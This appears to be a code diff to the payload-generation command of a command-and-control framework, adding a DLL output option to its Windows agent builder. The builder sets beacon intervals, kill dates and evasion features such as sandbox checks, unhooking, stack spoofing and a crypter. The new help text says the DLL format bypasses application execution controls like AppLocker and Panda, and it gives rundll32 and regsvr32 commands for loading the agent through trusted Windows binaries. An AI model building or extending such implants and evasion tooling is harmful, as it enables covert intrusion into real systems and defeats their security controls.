@@ -5,6 +5,7 @@ Usage in operator shell:
   generate                                    (defaults: current listener URL, keys/server_pub.pem)
   generate --url https://c2.example.com/api/v1 --sleep 30 --jitter 20
   generate --arch x86 --kill-date 2026-12-31
+  generate --url https://... --sleep 10 --format dll
 """
 
 import shlex
@@ -28,6 +29,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "kill_date": "",
         "magic": 0xDEADF00D,
         "output": None,
+        "format": "exe",
         "no_evasion": False,
         "no_sandbox": False,
         "no_unhook": False,
@@ -81,6 +83,12 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
                 console.print(f"[red]--target-os must be win10 or win11, got: {val}[/red]")
                 return
             opts["target_os"] = val; i += 2
+        elif parts[i] in ("--format", "-f") and i + 1 < len(parts):
+            val = parts[i + 1]
+            if val not in ("exe", "dll"):
+                console.print(f"[red]--format must be exe or dll, got: {val}[/red]")
+                return
+            opts["format"] = val; i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
         elif parts[i] in bool_flags:
@@ -130,9 +138,11 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         console.print("[yellow]    sudo apt install mingw-w64[/yellow]")
         return
 
-    console.print(f"[cyan]Generating {opts['arch']} agent...[/cyan]")
+    fmt_label = "DLL" if opts["format"] == "dll" else "EXE"
+    console.print(f"[cyan]Generating {opts['arch']} agent ({fmt_label})...[/cyan]")
     console.print(f"  C2 URL:    {opts['url']}")
     console.print(f"  Sleep:     {opts['sleep']}s / Jitter: {opts['jitter']}%")
+    console.print(f"  Format:    {fmt_label}")
     if opts["kill_date"]:
         console.print(f"  Kill date: {opts['kill_date']}")
 
@@ -153,7 +163,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
     console.print()
 
     try:
-        exe_path = build_agent(
+        out_path = build_agent(
             project_root,
             listener_url=opts["url"],
             rsa_pubkey_path=rsa_path,
@@ -177,9 +187,15 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             target_os=opts["target_os"],
             debug=opts["debug"],
             no_crypt=opts["no_crypt"],
+            format=opts["format"],
         )
-        size_kb = exe_path.stat().st_size / 1024
-        console.print(f"[green]✓ Agent built: {exe_path} ({size_kb:.1f} KB)[/green]")
+        size_kb = out_path.stat().st_size / 1024
+        console.print(f"[green]✓ Agent built: {out_path} ({size_kb:.1f} KB)[/green]")
+        if opts["format"] == "dll":
+            console.print()
+            console.print("[dim]Load with:[/dim]")
+            console.print(f"[dim]  rundll32 {out_path.name},Start[/dim]")
+            console.print(f"[dim]  regsvr32 /s {out_path.name}[/dim]")
     except FileNotFoundError as e:
         console.print(f"[red]✗ {e}[/red]")
     except RuntimeError as e:
@@ -196,9 +212,10 @@ def _print_help():
   --sleep, -s SEC       Beacon interval in seconds (default: 60)
   --jitter, -j PCT      Jitter percentage 0-99 (default: 25)
   --arch, -a ARCH       x64 or x86 (default: x64)
+  --format, -f FMT      Output format: exe (default) or dll
   --kill-date DATE      Agent self-destructs after YYYY-MM-DD
   --magic HEX           Packet magic bytes (default: 0xDEADF00D)
-  --output, -o PATH     Output .exe path (default: builds/agent_ARCH.exe)
+  --output, -o PATH     Output path (default: builds/agent_ARCH.exe|dll)
 
 [bold]Evasion / Debug:[/bold]
   --debug               Enable agent debug log (%TEMP%\\agent_debug.log)
@@ -216,11 +233,18 @@ def _print_help():
   --target-os OS        Target OS: win10 or win11 (default: win10)
                         Stack spoofing only enabled on win11
 
+[bold]DLL format notes:[/bold]
+  The DLL format bypasses application execution controls (Panda, AppLocker)
+  by loading the agent via a trusted Windows binary. Crypter is skipped
+  (the trusted host handles on-disk reputation). Load with:
+    rundll32 agent.dll,Start
+    regsvr32 /s agent.dll
+
 [bold]Examples:[/bold]
   generate
   generate --url https://cdn.example.com/api/v1 --sleep 30
+  generate --url https://cdn.example.com/api/v1 --format dll
   generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
   generate --arch x86 --kill-date 2026-12-31
   generate --target-os win11
-  generate --target-os win11 --no-stack-spoofing
 """)
